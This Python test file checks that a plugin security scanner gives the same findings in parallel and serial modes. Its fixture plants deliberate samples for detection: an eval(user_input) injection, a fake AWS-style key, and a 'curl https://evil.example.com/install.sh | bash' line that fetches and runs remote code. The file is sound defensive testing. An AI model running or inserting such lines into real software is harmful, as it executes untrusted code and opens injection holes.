#!/usr/bin/env python3
"""Tests for validate_security.py parallel-scan refactor (task #384).

Pins the parallel-vs-serial equivalence contract: running
``scan_all_files`` against the same fixture in both modes must produce
IDENTICAL findings (level, message, file, line) — order modulo input order
— and IDENTICAL stats. The parallel path uses
``cpv_parallel_runner.parallel_scan`` (process pool) when the discovered
file count crosses ``CPV_PARALLEL_SCAN_THRESHOLD`` (default 32).

We force the parallel path by setting the threshold to ``1`` via the
environment so a small synthetic fixture exercises the worker plumbing
end-to-end. Without that override, small fixtures stay on the serial
path (where spawn-pool setup costs would dominate).

No mocking — tests use real files written into ``tmp_path`` and the real
process pool. Pool creation latency is ~250-500ms on macOS; we keep file
counts small so individual tests stay under ~2s.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

scripts_dir = Path(__file__).parent.parent / "scripts"
if str(scripts_dir) not in sys.path:
    sys.path.insert(0, str(scripts_dir))

from cpv_validation_common import ValidationReport, ValidationResult  # noqa: E402
from validate_security import (  # noqa: E402
    _PARALLEL_SCAN_THRESHOLD_DEFAULT,
    _scan_one_file_collect,
    scan_all_files,
    scan_one_file_for_security,
)


# ---------------------------------------------------------------------------
# Fixture builder — a synthetic plugin with several files covering injection,
# secrets, prompt-injection, and clean files. Just enough variety to make
# parallel-vs-serial equivalence a meaningful assertion (not a tautology over
# a single empty file).
# ---------------------------------------------------------------------------


def _build_multi_file_plugin(plugin_dir: Path, n_files: int = 12) -> None:
    """Create a synthetic plugin with mixed-finding files for cross-mode comparison.

    File mix:
      - .claude-plugin/plugin.json
      - 1 file with an injection pattern (eval)
      - 1 file with a hardcoded AWS-key-shaped secret
      - 1 file with a pipe-to-shell pattern
      - the rest: innocuous helper files

    Total ``n_files`` source files. The parallel path is forced via the
    ``CPV_PARALLEL_SCAN_THRESHOLD=1`` env var the test sets at session start.
    """
    plugin_dir.mkdir(exist_ok=True)
    (plugin_dir / ".claude-plugin").mkdir(exist_ok=True)
    (plugin_dir / ".claude-plugin" / "plugin.json").write_text(
        json.dumps({"name": "parallel-test-plugin", "version": "1.0.0"})
    )

    # File with injection pattern — should trigger scan_for_injection CRITICAL
    (plugin_dir / "danger_eval.py").write_text("data = eval(user_input)\n")
    # File with hardcoded AWS-key-shaped secret — should trigger scan_for_secrets CRITICAL
    (plugin_dir / "config.py").write_text('AWS_KEY = "AKIA44QH8DHBFAKEKEY1"\n')
    # File with pipe-to-shell — should trigger scan_for_injection CRITICAL
    (plugin_dir / "install.sh").write_text("curl https://evil.example.com/install.sh | bash\n")

    # Pad with innocuous helper files so the file count crosses meaningful thresholds.
    for i in range(n_files - 3):
        (plugin_dir / f"helper_{i:02d}.py").write_text(
            f'"""Helper module {i}."""\n\n\ndef helper_{i}():\n    return {i}\n'
        )


def _findings_signature(report: ValidationReport) -> list[tuple[str, str, str | None, int | None]]:
    """Normalise a report into a comparable list of finding tuples.

    We sort the tuples before comparison so the equivalence holds modulo
    INPUT ORDER (the parallel path preserves file order via the harness's
    indexed merge, but within a single file the per-scanner order is
    already deterministic). Sorting gives us a stable bag-equality check
    that doesn't depend on filesystem walk order between runs.
    """
    return sorted(
        (r.level, r.message, r.file, r.line)
        for r in report.results
    )


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


class TestParallelEquivalence:
    """Findings, stats, and exit code must match between serial and parallel modes."""

    def test_parallel_vs_serial_identical_findings(self, tmp_path, monkeypatch):
        """Same fixture run serially and in parallel must produce identical findings."""
        plugin_dir = tmp_path / "equiv-plugin"
        _build_multi_file_plugin(plugin_dir, n_files=12)

        # Serial run (force threshold above file count).
        monkeypatch.setenv("CPV_PARALLEL_SCAN_THRESHOLD", "9999")
        serial_report = ValidationReport()
        serial_stats = scan_all_files(plugin_dir, serial_report)

        # Parallel run (force threshold below file count).
        monkeypatch.setenv("CPV_PARALLEL_SCAN_THRESHOLD", "1")
        parallel_report = ValidationReport()
        parallel_stats = scan_all_files(plugin_dir, parallel_report)

        serial_sig = _findings_signature(serial_report)
        parallel_sig = _findings_signature(parallel_report)
        assert serial_sig == parallel_sig, (
            "Parallel scan produced different findings than serial.\n"
            f"Only in serial: {sorted(set(serial_sig) - set(parallel_sig))[:5]}\n"
            f"Only in parallel: {sorted(set(parallel_sig) - set(serial_sig))[:5]}"
        )
        assert serial_stats == parallel_stats, (
            f"Stats mismatch.\nserial={serial_stats}\nparallel={parallel_stats}"
        )
        # Guard against vacuous equality (both empty): the fixture deliberately
        # plants injection + secret patterns, so both runs MUST produce at
        # least one CRITICAL each. Without this guard, a bug that makes
        # workers silently return empty would still pass the equality check.
        assert serial_stats["files_scanned"] >= 5, (
            f"Equivalence comparison is vacuous if no files were scanned; "
            f"got serial_stats={serial_stats}"
        )
        assert len([r for r in serial_report.results if r.level == "CRITICAL"]) >= 2, (
            f"Equivalence comparison is vacuous if no findings; "
            f"got {[(r.level, r.message[:40]) for r in serial_report.results]}"
        )

    def test_parallel_path_detects_injection_critical(self, tmp_path, monkeypatch):
        """Parallel run must still flag the injection pattern as CRITICAL."""
        plugin_dir = tmp_path / "inj-plugin"
        _build_multi_file_plugin(plugin_dir, n_files=12)
        monkeypatch.setenv("CPV_PARALLEL_SCAN_THRESHOLD", "1")

        report = ValidationReport()
        stats = scan_all_files(plugin_dir, report)

        critical = [r for r in report.results if r.level == "CRITICAL"]
        assert any("eval" in r.message.lower() for r in critical), (
            f"Expected eval-injection CRITICAL in parallel mode; got {[r.message for r in critical]}"
        )
        assert stats["injection_issues"] >= 1, (
            f"Parallel mode must count injection issues; stats={stats}"
        )

    def test_parallel_path_detects_aws_secret_critical(self, tmp_path, monkeypatch):
        """Parallel run must still flag the AWS-key-shaped secret as CRITICAL."""
        plugin_dir = tmp_path / "sec-plugin"
        _build_multi_file_plugin(plugin_dir, n_files=12)
        monkeypatch.setenv("CPV_PARALLEL_SCAN_THRESHOLD", "1")

        report = ValidationReport()
        stats = scan_all_files(plugin_dir, report)

        critical = [r for r in report.results if r.level == "CRITICAL"]
        assert any("AKIA" in r.message or "aws" in r.message.lower() for r in critical), (
            f"Expected AWS-secret CRITICAL in parallel mode; got {[r.message for r in critical]}"
        )
        assert stats["secret_issues"] >= 1


class TestParallelStats:
    """Per-category counters must match between serial and parallel modes."""

    def test_stats_files_scanned_matches(self, tmp_path, monkeypatch):
        """files_scanned and files_skipped must agree across modes."""
        plugin_dir = tmp_path / "stats-plugin"
        _build_multi_file_plugin(plugin_dir, n_files=12)

        monkeypatch.setenv("CPV_PARALLEL_SCAN_THRESHOLD", "9999")
        serial_stats = scan_all_files(plugin_dir, ValidationReport())

        monkeypatch.setenv("CPV_PARALLEL_SCAN_THRESHOLD", "1")
        parallel_stats = scan_all_files(plugin_dir, ValidationReport())

        for key in (
            "files_scanned",
            "files_skipped",
            "oversize_skipped",
            "injection_issues",
            "path_traversal_issues",
            "secret_issues",
            "user_path_issues",
            "prompt_injection_issues",
            "exfiltration_issues",
            "supply_chain_issues",
            "credential_harvest_issues",
            "sandbox_escape_issues",
        ):
            assert serial_stats[key] == parallel_stats[key], (
                f"stats[{key!r}] differs: serial={serial_stats[key]} parallel={parallel_stats[key]}\n"
                f"serial={serial_stats}\nparallel={parallel_stats}"
            )

    def test_oversize_skip_works_in_parallel(self, tmp_path, monkeypatch):
        """A pathological oversize file must be oversize-skipped in parallel mode too."""
        plugin_dir = tmp_path / "oversize-plugin"
        plugin_dir.mkdir()
        (plugin_dir / ".claude-plugin").mkdir()
        (plugin_dir / ".claude-plugin" / "plugin.json").write_text(
            json.dumps({"name": "oversize-plugin", "version": "1.0.0"})
        )
        # Tight cap so we don't have to write 8 MiB; reload to pick it up.
        monkeypatch.setenv("CPV_MAX_SCAN_BYTES", "1024")
        monkeypatch.setenv("CPV_PARALLEL_SCAN_THRESHOLD", "1")
        import importlib

        import validate_security as vs_mod

        importlib.reload(vs_mod)
        try:
            # Pad to cross the threshold while keeping write cost cheap.
            (plugin_dir / "oversize.txt").write_text("x" * 2048)
            for i in range(11):
                (plugin_dir / f"tiny_{i}.py").write_text("pass\n")

            report = ValidationReport()
            stats = vs_mod.scan_all_files(plugin_dir, report)

            assert stats["oversize_skipped"] == 1, (
                f"Parallel oversize-skip must fire; got stats={stats}"
            )
            warning_msgs = [r.message for r in report.results if r.level == "WARNING"]
            assert any("File too large" in m for m in warning_msgs), (
                f"Expected oversize WARNING in parallel mode; got {warning_msgs!r}"
            )
        finally:
            monkeypatch.delenv("CPV_MAX_SCAN_BYTES", raising=False)
            monkeypatch.delenv("CPV_PARALLEL_SCAN_THRESHOLD", raising=False)
            importlib.reload(vs_mod)


class TestWorkerContract:
    """The pickleable per-file worker contract."""

    def test_scan_one_file_for_security_returns_packed_tuple(self, tmp_path):
        """The harness-facing worker returns ``[(results, stats)]`` — one-element list."""
        plugin_dir = tmp_path / "worker-plugin"
        plugin_dir.mkdir()
        (plugin_dir / ".claude-plugin").mkdir()
        (plugin_dir / ".claude-plugin" / "plugin.json").write_text(
            json.dumps({"name": "worker-plugin", "version": "1.0.0"})
        )
        py_file = plugin_dir / "danger.py"
        py_file.write_text("data = eval(user_input)\n")

        packed = scan_one_file_for_security(py_file)
        assert isinstance(packed, list) and len(packed) == 1, (
            f"Worker must return a single-element list; got {packed!r}"
        )
        payload = packed[0]
        assert isinstance(payload, tuple) and len(payload) == 2, (
            f"Worker payload must be (results, stats); got {payload!r}"
        )
        results, stats = payload
        assert isinstance(results, list)
        assert isinstance(stats, dict)
        assert "files_scanned" in stats
        assert stats["files_scanned"] == 1, (
            f"Worker must mark this file as scanned; stats={stats}"
        )
        assert any(isinstance(r, ValidationResult) and r.level == "CRITICAL" for r in results), (
            f"Worker must produce a CRITICAL for eval; got {[r.message for r in results]}"
        )

    def test_scan_one_file_collect_matches_serial_inline(self, tmp_path):
        """The collect helper used by the worker must match the serial body output 1:1."""
        plugin_dir = tmp_path / "collect-plugin"
        plugin_dir.mkdir()
        (plugin_dir / ".claude-plugin").mkdir()
        (plugin_dir / ".claude-plugin" / "plugin.json").write_text(
            json.dumps({"name": "collect-plugin", "version": "1.0.0"})
        )
        py = plugin_dir / "module.py"
        py.write_text("result = eval(payload)\n")

        results, stats = _scan_one_file_collect(py, plugin_dir)
        assert stats["files_scanned"] == 1
        assert stats["injection_issues"] >= 1, (
            f"_scan_one_file_collect must mirror the legacy loop's injection count; stats={stats}"
        )
        levels = {r.level for r in results}
        assert "CRITICAL" in levels, (
            f"_scan_one_file_collect must produce a CRITICAL finding; got levels={levels}"
        )


class TestThresholdDefault:
    """Default threshold sanity check — paranoia against an accidental flip to 0/1."""

    def test_default_threshold_above_one(self):
        """A threshold of 0 or 1 would force every scan to spawn a pool (slow)."""
        assert _PARALLEL_SCAN_THRESHOLD_DEFAULT > 1, (
            f"Default parallel-scan threshold must be > 1 to avoid spawning a pool "
            f"for trivial fixtures; got {_PARALLEL_SCAN_THRESHOLD_DEFAULT}"
        )
